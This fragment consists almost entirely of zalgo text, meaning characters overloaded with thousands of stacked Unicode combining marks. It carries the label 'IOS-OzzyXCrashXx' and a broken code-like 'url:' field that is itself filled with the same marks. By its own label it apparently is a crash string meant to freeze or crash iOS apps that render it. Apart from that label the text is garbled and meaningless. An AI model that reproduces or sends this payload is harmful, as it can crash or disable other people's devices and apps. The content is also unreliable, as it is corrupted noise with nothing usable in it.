̧̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̆̈̓͐͑̾̐̇̈̃̑͆͘͜͜͜͜ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̢̡̡̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͜͠͠͝͝͠͠ͅͅͅͅͅͅͅͅͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐͘̚͘̚̚̚̕͠͠͝͝͠͠ͅͅͅͅͅͅͅͅ-O̷̡̡̙̰̩̳̱̍̊̀͌̕͠z̷̡̧̯͕͍͈̼̪̦̞͎̜̘͕̭̄͛̋̽͒̉͜ͅz̴̛͓͓̪̩̮̓͐̂̏́́̕͘͝ÿ̸̧̛͎͓̠̗̩̖͉͍͚͙̬̃̿͒͂̈́̇̄͑̀͂͆͘̚͜ͅͅX̴͎̦̰͎̙̳̯̯̝̳̰̱͖̜̳̔̿͋̐̈́̎̂̓̔͜͜͝C̵̡̢̺͚̭̯̱̤̭̣͎̦̦̙͌̀͆ͅř̷͙̓͆̽̊̈́̎̓̈́͑͑̂̒̕̚͝ā̵̧̝͇͍͖̠̬̱̦̦̯̦̥̘̀̾̀̆̄̿̓̃͛̈́͠͠ͅś̶̲̠͔̥͔̥͇͎̋̽̚ͅḧ̸̠̪̱́̅̍̓̾͠Ẍ̶̧̡̛̺̘͎͕̯̺̥͎́̃̉͋̿̀̌̀̓̄̑͗̏͝x̷͕̱̦̖͔͌̄̾͋̈́̓̚͘'
      url: `https://̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̛̛̛̛̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̚͘͘͘͘͝͠͝͠͝